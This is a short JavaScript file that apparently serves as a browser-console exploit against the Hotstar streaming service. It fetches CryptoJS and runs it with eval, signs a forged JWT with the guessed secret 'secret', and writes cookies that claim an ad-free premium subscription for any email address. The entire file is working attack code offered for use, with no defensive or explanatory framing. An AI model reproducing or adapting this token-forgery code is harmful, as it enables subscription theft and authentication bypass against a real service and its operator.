(function hotstar_login(email) {

  function loadScriptSync (src) {
    var xhrObj = new XMLHttpRequest();
    xhrObj.open('GET',src, false);
    xhrObj.send(null);
    eval(xhrObj.responseText);
  }

  loadScriptSync('https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.min.js'); 
  loadScriptSync('https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/hmac-sha256.min.js'); 
  loadScriptSync('https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/enc-base64.min.js'); 

  document.tamper_cookie = function() {
    var header = {
      'alg': 'HS256'
    }
  
    var payload = "{\"hId\":\"acn|XXXX\",\"pId\":\"XXXX\",\"name\":\"\",\"email\":\"XXXX\",\"ip\":\"\",\"countryCode\":\"IN\",\"customerType\":\"nu\",\"type\":\"email\",\"deviceId\":\"\",\"version\":\"v2\",\"subscriptions\":{\"in\":{\"HotstarPremium\":{\"showAds\":\"0\",\"expiry\":\"2020-06-10T23:59:59.000Z\",\"status\":\"S\"}}}}";
    for(i in [0,1,2]) {
      payload = payload.replace("XXXX", email);
    }
    var data = {
      "sub": payload,
      "iss": "UM",
      "exp": 1609286400
    };
  
    var secret = "secret";
  
    function base64url(source) {
      encodedSource = CryptoJS.enc.Base64.stringify(source);
      encodedSource = encodedSource.replace(/=+$/, '');
      encodedSource = encodedSource.replace(/\+/g, '-');
      encodedSource = encodedSource.replace(/\//g, '_');
      return encodedSource;
    }
  
    var stringifiedHeader = CryptoJS.enc.Utf8.parse(JSON.stringify(header));
    var encodedHeader = base64url(stringifiedHeader);
  
    var stringifiedData = CryptoJS.enc.Utf8.parse(JSON.stringify(data));
    var encodedData = base64url(stringifiedData);
  
    var signature = encodedHeader + "." + encodedData;
    signature = CryptoJS.HmacSHA256(signature, secret);
    signature = base64url(signature);
  
    var jwt = encodedHeader + '.' + encodedData + '.' + signature
  
    cookie = "userMemberCoockieObj={\"userMemberEmail\":\"XXXX\",\"userMemberState\":\"S\",\"userMemberName\":\"\",\"fbId\":\"\",\"crmAccountId\":\"acn|XXXX\",\"DOB\":\"\",\"gender\":\"\",\"loginMethod\":\"email\",\"subscriptions\":{\"in\":{\"HotstarPremium\":{\"status\":\"S\",\"expiry\":\"2020-06-10T23:59:59.000Z\",\"showAds\":\"0\"}}},\"pId\":\"XXXX\",\"hId\":\"acn|XXXX\",\"deviceId\":\"\",\"version\":\"v2\"};"
    for(i in [0,1,2,3]) {
      cookie = cookie.replace("XXXX", email);
    }
    document.cookie = cookie;
  
    cookie = "userMemberHID=YYYY"
    cookie = cookie.replace("YYYY", jwt);
    document.cookie = cookie;
  }

  var s = document.createElement('script');
  s.type = 'text/javascript';
  s.async = false;
  var code = 'document.tamper_cookie();';
  try {
    s.appendChild(document.createTextNode(code));
    document.body.appendChild(s);
  } catch (e) {
    s.text = code;
    document.body.appendChild(s);
  }

  
})("example@gmail.com");
